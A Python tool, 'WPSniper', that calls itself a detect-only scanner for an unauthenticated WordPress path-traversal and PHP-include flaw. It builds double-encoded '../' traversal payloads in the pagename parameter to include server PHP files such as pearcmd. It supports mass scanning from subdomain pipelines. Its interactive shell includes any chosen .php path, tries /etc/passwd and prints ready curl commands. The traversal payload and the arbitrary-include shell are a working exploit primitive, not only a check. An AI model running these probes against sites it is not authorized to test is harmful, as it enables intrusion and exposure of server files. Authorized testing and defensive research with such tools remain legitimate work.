#!/usr/bin/env python3
"""
WPSniper v1.3 — CVE-2026-87902 detector
WordPress get_page_template() unauth path traversal / PHP include

Author: Mitsec  https://x.com/ynsmroztas

Detect only. No webshell, no pearcmd config-create, no OS command exec.
Pipeline: subfinder | httpx | python3 WPSniper.py
"""

from __future__ import annotations

import argparse
import hashlib
import json
import re
import sys
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import quote, urlparse

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning

    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("pip install requests", file=sys.stderr)
    sys.exit(1)

BANNER = (
    "\033[95m\033[1m\n"
    " ██╗    ██╗██████╗ ███████╗███╗   ██╗██╗██████╗ ███████╗██████╗\n"
    " ██║    ██║██╔══██╗██╔════╝████╗  ██║██║██╔══██╗██╔════╝██╔══██╗\n"
    " ██║ █╗ ██║██████╔╝███████╗██╔██╗ ██║██║██████╔╝█████╗  ██████╔╝\n"
    " ██║███╗██║██╔═══╝ ╚════██║██║╚██╗██║██║██╔═══╝ ██╔══╝  ██╔══██╗\n"
    " ╚███╔███╔╝██║     ███████║██║ ╚████║██║██║     ███████╗██║  ██║\n"
    "  ╚══╝╚══╝ ╚═╝     ╚══════╝╚═╝  ╚═══╝╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝\n"
    "\033[0m\033[96m"
    "  CVE-2026-87902  ·  get_page_template LFI  ·  detect-only\n"
    "  Mitsec  ·  x.com/ynsmroztas\n"
    "\033[0m"
)

C = {
    "r": "\033[91m",
    "g": "\033[92m",
    "y": "\033[93m",
    "c": "\033[96m",
    "m": "\033[95m",
    "b": "\033[1m",
    "d": "\033[2m",
    "x": "\033[0m",
    "bg_r": "\033[41m\033[97m\033[1m",
    "bg_g": "\033[42m\033[30m\033[1m",
    "bg_y": "\033[43m\033[30m\033[1m",
    "bg_c": "\033[46m\033[30m\033[1m",
}

UA = "WPSniper/1.2 (authorized-testing)"
LOCK = threading.Lock()

AFFECTED_MIN = (4, 7, 0)
AFFECTED_MAX = (7, 1, 1)

PATCH_TABLE = [
    ((7, 1), (7, 1, 2)),
    ((7, 0), (7, 0, 6)),
    ((6, 9), (6, 9, 9)),
    ((6, 8), (6, 8, 10)),
    ((6, 7), (6, 7, 9)),
    ((6, 6), (6, 6, 9)),
    ((6, 5), (6, 5, 12)),
    ((6, 4), (6, 4, 12)),
    ((6, 3), (6, 3, 12)),
    ((6, 2), (6, 2, 13)),
    ((6, 1), (6, 1, 14)),
    ((6, 0), (6, 0, 16)),
    ((5, 9), (5, 9, 18)),
    ((5, 8), (5, 8, 17)),
    ((5, 7), (5, 7, 19)),
    ((5, 6), (5, 6, 21)),
    ((5, 5), (5, 5, 22)),
    ((5, 4), (5, 4, 23)),
    ((5, 3), (5, 3, 25)),
    ((5, 2), (5, 2, 28)),
    ((5, 1), (5, 1, 26)),
    ((5, 0), (5, 0, 29)),
    ((4, 9), (4, 9, 33)),
    ((4, 8), (4, 8, 32)),
    ((4, 7), (4, 7, 37)),
]

# Weak tokens alone = FP (seen on huge marketing pages).
WEAK_PEAR = ("pearcmd", "PEAR")
# Confirm include only with ≥2 strong tokens, and tokens MUST be absent from baseline.
STRONG_PEAR = (
    "PEAR Version:",
    "Usage: pear",
    "PEAR_Config",
    "pear.php",
    "Commands for pear",
    "config-create",
    "DEPRECATED: PEAR commands",
)

PASSWD_RE = re.compile(r"(?m)^root:.*:0:0:")
GEN_RE = re.compile(
    r'<meta[^>]+name=["\']generator["\'][^>]+content=["\']WordPress\s+([0-9.]+)',
    re.I,
)
GEN_RE2 = re.compile(r"WordPress\s+([0-9]+\.[0-9]+(?:\.[0-9]+)?)", re.I)
VER_FEED = re.compile(r"<generator>https?://wordpress\.org/\?v=([0-9.]+)", re.I)

PEAR_PATHS = (
    "/usr/local/lib/php/pearcmd",
    "/usr/share/php/pearcmd",
    "/usr/lib/php/pearcmd",
    "/usr/lib/php/PEAR/pearcmd",
)


def radar(msg: str, tag: str = "radar") -> None:
    with LOCK:
        print(f"{C['c']}[{tag}]{C['x']} {msg}", flush=True)


def badge(kind: str, msg: str) -> None:
    skins = {
        "VULN": C["bg_r"],
        "SAFE": C["bg_g"],
        "SKIP": C["bg_y"],
        "FAIL": C["bg_y"],
        "INFO": C["bg_c"],
        "FP": C["bg_y"],
    }
    skin = skins.get(kind, C["c"])
    with LOCK:
        print(f"{skin} {kind} {C['x']} {msg}", flush=True)


def parse_ver(s: str) -> Optional[tuple]:
    parts = re.findall(r"\d+", s or "")
    if len(parts) < 2:
        return None
    nums = [int(x) for x in parts[:3]]
    while len(nums) < 3:
        nums.append(0)
    return tuple(nums[:3])


def version_status(ver: Optional[tuple]) -> str:
    if not ver:
        return "unknown"
    if ver < AFFECTED_MIN:
        return "too-old"
    mm = (ver[0], ver[1])
    for key, patched in PATCH_TABLE:
        if mm == key:
            return "patched" if ver >= patched else "affected"
    if ver <= AFFECTED_MAX:
        return "affected"
    return "patched"


def origin(url: str) -> str:
    url = (url or "").strip().split()[0]
    if not url:
        return ""
    if "://" not in url:
        url = "https://" + url
    p = urlparse(url)
    if not p.netloc:
        return ""
    path = p.path or ""
    last = path.rsplit("/", 1)[-1]
    if last and "." in last:
        path = path.rsplit("/", 1)[0]
    return f"{p.scheme}://{p.netloc}{path}".rstrip("/")


def sha(s: str) -> str:
    return hashlib.sha256((s or "").encode("utf-8", "ignore")).hexdigest()[:12]


def encode_pagename(rel: str) -> str:
    """
    WP prefixes page- so leading 'templates/' maps onto theme dir page-templates/.
    Double-encode so sanitize_title keeps %xx and get_page_template urldecode()s once.
    rel is POSIX path WITHOUT .php  (locate_template appends .php)
    """
    rel = rel.lstrip("/")
    trav = "templates/" + "../" * 12 + rel
    once = quote(trav, safe="")
    return quote(once, safe="")


class Http:
    def __init__(self, timeout: float = 14.0):
        self.s = requests.Session()
        self.s.verify = False
        self.s.headers["User-Agent"] = UA
        self.timeout = timeout

    def get(self, url: str, **kw):
        return self.s.get(url, timeout=self.timeout, allow_redirects=True, **kw)


@dataclass
class Probe:
    url: str
    status: int
    length: int
    digest: str
    body: str
    strong: list[str] = field(default_factory=list)
    passwd: bool = False


@dataclass
class Hit:
    url: str
    status: str
    version: str = "?"
    theme: str = "?"
    page_id: str = "?"
    note: str = ""
    pear: bool = False
    fp_reason: str = ""
    probe_url: str = ""


def fingerprint(http: Http, base: str, quiet: bool) -> dict:
    info = {"version": None, "theme": None, "is_wp": False, "html": ""}
    try:
        r = http.get(base + "/")
        body = r.text or ""
        info["html"] = body[:120000]
        if any(x in body for x in ("wp-content", "wp-includes", "WordPress", "wp-json")):
            info["is_wp"] = True
        m = GEN_RE.search(body) or GEN_RE2.search(body)
        if m:
            info["version"] = m.group(1)
        tm = re.search(r"/wp-content/themes/([a-zA-Z0-9_-]+)/", body)
        if tm:
            info["theme"] = tm.group(1).lower()
        if not quiet:
            radar(f"{base}  generator={info['version'] or '?'}  theme={info['theme'] or '?'}")
    except Exception as e:
        if not quiet:
            radar(f"{base} home fail: {e}", "err")
        return info

    if not info["version"]:
        for path in ("/feed/", "/?feed=rss2"):
            try:
                r = http.get(base + path)
                m = VER_FEED.search(r.text or "") or GEN_RE2.search(r.text or "")
                if m:
                    info["version"] = m.group(1)
                    info["is_wp"] = True
                    break
            except Exception:
                continue
    return info


def find_page_id(http: Http, base: str, html: str) -> int:
    ids = set()
    for m in re.finditer(r"[?&]page_id=(\d+)", html or ""):
        ids.add(int(m.group(1)))
    try:
        r = http.get(base + "/wp-json/wp/v2/pages?per_page=8")
        if r.status_code == 200 and (r.text or "").lstrip().startswith("["):
            for item in json.loads(r.text):
                if isinstance(item, dict) and item.get("id"):
                    ids.add(int(item["id"]))
    except Exception:
        pass
    return sorted(ids)[0] if ids else 2


def theme_page_dir(http: Http, base: str, theme: Optional[str], quiet: bool) -> bool:
    paths = []
    if theme:
        paths.append(f"/wp-content/themes/{theme}/page-templates/")
    for t in ("twentytwelve", "twentyfourteen", "neve", "hestia", "sydney"):
        p = f"/wp-content/themes/{t}/page-templates/"
        if p not in paths:
            paths.append(p)
    for p in paths:
        try:
            r = http.get(base + p)
            if r.status_code in (200, 403, 401):
                if not quiet:
                    radar(f"theme dir {p} → {r.status_code}")
                return True
        except Exception:
            continue
    return False


def fetch(http: Http, url: str) -> Probe:
    r = http.get(url)
    body = r.text or ""
    strong = [s for s in STRONG_PEAR if s in body]
    return Probe(
        url=url,
        status=r.status_code,
        length=len(body),
        digest=sha(body),
        body=body,
        strong=strong,
        passwd=bool(PASSWD_RE.search(body)),
    )


def include_url(base: str, page_id: int, rel_no_php: str) -> str:
    return f"{base}/?page_id={page_id}&pagename={encode_pagename(rel_no_php)}"


def confirm_pear(base_p: Probe, probe_p: Probe) -> tuple[str, str]:
    """
    Returns (verdict, reason)
    verdict: VULN | FP | NEG
    """
    if probe_p.digest == base_p.digest:
        return "FP", "identical body to ?page_id= baseline"
    # length almost same AND no strong token unique to probe
    unique = [s for s in probe_p.strong if s not in (base_p.body or "")]
    if not unique:
        # weak-only match
        if "pearcmd" in probe_p.body.lower() and "pearcmd" in (base_p.body or "").lower():
            return "FP", "weak token 'pearcmd' already in baseline page"
        if "pearcmd" in probe_p.body.lower() and not unique:
            return "FP", "only weak token, no PEAR CLI banner"
        return "NEG", f"no strong PEAR banner (http={probe_p.status} len={probe_p.length})"
    if len(unique) < 1:
        return "FP", "insufficient PEAR evidence"
    # require length delta OR at least one unique strong
    return "VULN", f"include confirmed unique={unique[:3]} Δlen={probe_p.length - base_p.length}"


def lfi_probe(http: Http, base: str, page_id: int) -> tuple[str, str, Optional[Probe], Optional[Probe]]:
    base_p = fetch(http, f"{base}/?page_id={page_id}")
    last_reason = "no pear path answered"
    last_pr = None
    last_verd = "NEG"
    for rel in PEAR_PATHS:
        pr = fetch(http, include_url(base, page_id, rel))
        last_pr = pr
        verd, reason = confirm_pear(base_p, pr)
        if verd == "VULN":
            return verd, f"{rel} {reason}", base_p, pr
        last_reason = f"{rel} {reason}"
        if verd == "FP":
            # keep FP if nothing stronger appears later
            last_verd = "FP"
        else:
            last_verd = last_verd if last_verd == "FP" else "NEG"
    return last_verd, last_reason, base_p, last_pr


def scan_one(url: str, http: Http, quiet: bool) -> Hit:
    base = origin(url)
    if not base:
        return Hit(url=url, status="SKIP", note="bad-url")
    fp = fingerprint(http, base, quiet)
    if not fp["is_wp"] and not fp["version"]:
        return Hit(url=base, status="SKIP", note="not-wordpress")

    ver_s = fp["version"] or "?"
    vst = version_status(parse_ver(fp["version"] or ""))
    theme = fp["theme"] or "?"
    page_id = find_page_id(http, base, fp["html"])
    has_dir = theme_page_dir(http, base, fp["theme"], quiet)

    if vst == "patched":
        return Hit(url=base, status="SAFE", version=ver_s, theme=theme, page_id=str(page_id), note="patched-branch")

    verd, reason, _, last_pr = lfi_probe(http, base, page_id or 2)
    probe_url = last_pr.url if last_pr else ""
    if verd == "VULN":
        return Hit(
            url=base,
            status="VULN",
            version=ver_s,
            theme=theme,
            page_id=str(page_id),
            note=reason + (" +page-templates" if has_dir else ""),
            pear=True,
            probe_url=probe_url,
        )
    if verd == "FP":
        note = "false-positive " + reason
        if vst == "affected" and has_dir:
            return Hit(url=base, status="INFO", version=ver_s, theme=theme, page_id=str(page_id), note="affected+theme, " + note, fp_reason=reason, probe_url=probe_url)
        return Hit(url=base, status="SAFE", version=ver_s, theme=theme, page_id=str(page_id), note=note, fp_reason=reason, probe_url=probe_url)

    if vst == "affected" and has_dir:
        return Hit(url=base, status="INFO", version=ver_s, theme=theme, page_id=str(page_id), note="version+theme match, include unconfirmed (" + reason + ")", probe_url=probe_url)
    if vst == "affected":
        return Hit(url=base, status="INFO", version=ver_s, theme=theme, page_id=str(page_id), note="affected version, gadget unconfirmed", probe_url=probe_url)
    return Hit(
        url=base,
        status="SAFE",
        version=ver_s,
        theme=theme,
        page_id=str(page_id),
        note="include not confirmed (" + reason + ")",
        fp_reason=reason,
        probe_url=probe_url,
    )


def show_url(url: str) -> None:
    print(f"  {C['c']}GET{C['x']}  {url}")
    print(f"  {C['y']}curl{C['x']} curl -sk '{url}'")


def print_hit(h: Hit) -> None:
    extra = f"  {C['d']}ver={h.version} theme={h.theme} page_id={h.page_id}{C['x']}"
    badge(h.status, f"{h.url}{extra}  {h.note}")
    if h.probe_url:
        show_url(h.probe_url)


def summary(hits: list[Hit]) -> None:
    vuln = [h for h in hits if h.status == "VULN"]
    info = [h for h in hits if h.status == "INFO"]
    safe = [h for h in hits if h.status == "SAFE"]
    skip = [h for h in hits if h.status in ("SKIP", "FAIL")]
    print()
    print(f"{C['b']}{'─' * 64}{C['x']}")
    print(
        f"{C['b']} findings {C['x']}"
        f"  {C['r']}vuln={len(vuln)}{C['x']}"
        f"  {C['c']}info={len(info)}{C['x']}"
        f"  {C['g']}safe={len(safe)}{C['x']}"
        f"  {C['y']}skip={len(skip)}{C['x']}"
        f"  total={len(hits)}"
    )
    if vuln:
        print(f"{C['r']}{C['b']} VULN hosts{C['x']}")
        for h in vuln:
            print(f"   • {h.url}  {h.note}")
    if info:
        print(f"{C['c']}{C['b']} INFO (version/theme, include not confirmed){C['x']}")
        for h in info:
            print(f"   • {h.url}  {h.note}")
    print(f"{C['b']}{'─' * 64}{C['x']}")


HELP = f"""
{C['b']}  menu{C['x']}
  {C['c']}1{C['x']}  fp          version / theme / patched?
  {C['c']}2{C['x']}  pages       REST published pages (page_id)
  {C['c']}3{C['x']}  theme       page-templates directory
  {C['c']}4{C['x']}  probe       PEAR include + baseline diff  {C['d']}(no write){C['x']}
  {C['c']}5{C['x']}  diff        same as probe, print Δ + tokens
  {C['c']}6{C['x']}  passwd      try .../etc/passwd  {C['d']}(this CVE includes *.php){C['x']}
  {C['c']}7{C['x']}  include P   include a .php path without suffix
                    ex: include usr/local/lib/php/pearcmd
                    ex: include wp-content/uploads/ghsa7hp8-witness
  {C['c']}8{C['x']}  save        last body → /tmp/wpsniper-probe.html
  {C['c']}9{C['x']}  help
  {C['c']}0{C['x']}  exit

  Every probe prints the full URL and a copy-paste curl.
"""

ALIASES = {
    "1": "fp",
    "2": "pages",
    "3": "theme",
    "4": "probe",
    "5": "diff",
    "6": "passwd",
    "7": "include",
    "8": "save",
    "9": "help",
    "0": "exit",
    "?": "help",
}


def interactive(base: str, http: Http) -> None:
    base = origin(base)
    host = urlparse(base).netloc
    print(f"\n{C['m']}{C['b']} mitsec@{host}{C['x']}  — type a number or name")
    print(HELP)
    cache: dict = {}

    def need_pid() -> int:
        return find_page_id(http, base, "")

    while True:
        try:
            line = input(f"{C['m']}mitsec@{host}{C['x']} {C['c']}▶{C['x']} ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not line:
            continue
        raw, *rest = line.split(None, 1)
        arg = rest[0] if rest else ""
        cmd = ALIASES.get(raw, raw)
        if cmd in ("exit", "quit", "q"):
            break

        if cmd == "help":
            print(HELP)
            continue
        if cmd == "fp":
            fp = fingerprint(http, base, False)
            print(
                f"  version={fp['version']}  theme={fp['theme']}  wp={fp['is_wp']}"
                f"  status={version_status(parse_ver(fp['version'] or ''))}"
            )
            continue
        if cmd == "pages":
            u = base + "/wp-json/wp/v2/pages?per_page=10"
            show_url(u)
            try:
                r = http.get(u)
                print(f"  HTTP {r.status_code}")
                print((r.text or "")[:700])
            except Exception as e:
                print(" ", e)
            continue
        if cmd == "theme":
            theme_page_dir(http, base, None, False)
            continue
        if cmd in ("probe", "diff", "passwd", "include", "save"):
            pid = need_pid()
            if cmd == "save":
                body = cache.get("body")
                if not body:
                    print("  nothing cached — run 4 / probe first")
                    continue
                path = "/tmp/wpsniper-probe.html"
                with open(path, "w", encoding="utf-8", errors="ignore") as fh:
                    fh.write(body)
                print(f"  wrote {path} ({len(body)} bytes)")
                continue

            rel = "usr/local/lib/php/pearcmd"
            if cmd == "passwd":
                rel = "etc/passwd"
            elif cmd == "include":
                if not arg:
                    print("  usage: 7 include usr/local/lib/php/pearcmd")
                    print("         7 include wp-content/uploads/ghsa7hp8-witness")
                    continue
                rel = arg.lstrip("/").removesuffix(".php")

            base_url = f"{base}/?page_id={pid}"
            probe_u = include_url(base, pid, rel)
            print(f"  {C['d']}baseline{C['x']}")
            show_url(base_url)
            print(f"  {C['d']}probe{C['x']}")
            show_url(probe_u)

            base_p = fetch(http, base_url)
            pr = fetch(http, probe_u)
            cache["body"] = pr.body
            cache["probe"] = pr
            cache["base"] = base_p

            print(
                f"  baseline len={base_p.length} sha={base_p.digest}  |  "
                f"probe len={pr.length} sha={pr.digest} http={pr.status}"
            )
            print(f"  Δlen={pr.length - base_p.length}  same={pr.digest == base_p.digest}")
            print(f"  strong unique={[s for s in pr.strong if s not in base_p.body]}")

            if "GHSA7HP8-WITNESS" in pr.body and "GHSA7HP8-WITNESS" not in base_p.body:
                badge("VULN", "Abraxas witness GHSA7HP8-WITNESS in probe only")
                continue

            if cmd == "passwd" or rel.rstrip("/").endswith("passwd"):
                if pr.passwd and not base_p.passwd:
                    badge("VULN", "passwd stanza appeared (unusual for this CVE — verify manually)")
                else:
                    badge(
                        "INFO",
                        "no root:x:0:0:  — locate_template includes *.php, not raw /etc/passwd",
                    )
                continue

            verd, reason = confirm_pear(base_p, pr)
            badge("VULN" if verd == "VULN" else ("FP" if verd == "FP" else "SAFE"), reason)
            continue

        print("  unknown — type 9 or help")


def collect_targets(args) -> list[str]:
    out: list[str] = []
    if args.u:
        out.append(args.u)
    if args.l:
        with open(args.l, encoding="utf-8", errors="ignore") as fh:
            out.extend(x.strip() for x in fh if x.strip() and not x.startswith("#"))
    if not sys.stdin.isatty():
        for line in sys.stdin:
            line = line.strip()
            if line:
                out.append(line.split()[0])
    seen, uniq = set(), []
    for u in out:
        o = origin(u) or u
        if o not in seen:
            seen.add(o)
            uniq.append(u)
    return uniq


def main() -> int:
    ap = argparse.ArgumentParser(description="CVE-2026-87902 WordPress LFI detector")
    ap.add_argument("-u", help="single target")
    ap.add_argument("-l", help="url list")
    ap.add_argument("-t", type=int, default=6, help="threads")
    ap.add_argument("-q", action="store_true", help="quiet rows + summary only")
    ap.add_argument("--shell", action="store_true", help="interactive probe shell (single -u)")
    ap.add_argument("--timeout", type=float, default=14.0)
    args = ap.parse_args()

    if not args.q:
        print(BANNER)

    targets = collect_targets(args)
    if not targets:
        ap.print_help()
        print(
            "\nexamples:\n"
            "  python3 WPSniper.py -u https://wp.example.com --shell\n"
            "  subfinder -d example.com -silent | httpx -silent | python3 WPSniper.py -t 8"
        )
        return 2

    hits: list[Hit] = []
    if len(targets) == 1:
        http = Http(args.timeout)
        h = scan_one(targets[0], http, args.q)
        hits.append(h)
        print_hit(h)
        if args.shell:
            interactive(targets[0], http)
    else:
        if args.shell:
            print(f"{C['y']}[--shell ignored on pipeline]{C['x']}", file=sys.stderr)
        with ThreadPoolExecutor(max_workers=max(1, args.t)) as ex:
            futs = {ex.submit(scan_one, t, Http(args.timeout), args.q): t for t in targets}
            for fut in as_completed(futs):
                try:
                    h = fut.result()
                except Exception as e:
                    h = Hit(url=futs[fut], status="FAIL", note=str(e))
                hits.append(h)
                print_hit(h)

    summary(hits)
    return 0 if not any(h.status == "VULN" for h in hits) else 1


if __name__ == "__main__":
    sys.exit(main())
